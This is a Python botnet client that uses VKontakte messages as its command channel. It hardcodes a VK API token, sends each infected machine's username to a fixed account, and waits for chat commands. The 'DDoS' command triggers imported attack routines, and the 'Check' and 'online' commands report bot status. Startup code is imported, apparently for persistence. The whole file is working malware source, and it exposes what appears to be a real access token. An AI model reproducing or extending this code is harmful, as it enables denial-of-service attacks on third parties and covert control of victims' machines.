from MainDDoS import mainDDoS
from SecondDDoS import secondDDoS
from Startup import startup
from vk_api import VkApi
from vk_api.utils import get_random_id
from vk_api.longpoll import VkLongPoll, VkEventType
from getpass import getuser

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce'

vk_session = VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)

def message(message):
    vk.messages.send(
        peer_id = '300610283',
        message = message,
        random_id = get_random_id(),
    )



startup()
name = getuser()

for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
        if event.text == name + ' 16080305':
            message('Вход выполнен - ' + name)
            message("Команды: ")
            message('DDoS - войти в DDoS панель')
            message('Check - проверить появились-ли новые боты')
            message('online - боты онлайн')
            for event in longpoll.listen():
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        mainDDoS()
                    elif event.text == 'online':
                        message(name + ' - Админ онлайн')
        elif event.text == 'Check':
            message('Бот в сети! - ' + name)
            for event in longpoll.listen():
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        secondDDoS()
                    elif event.text == 'online':
                        message(name + ' - онлайн')
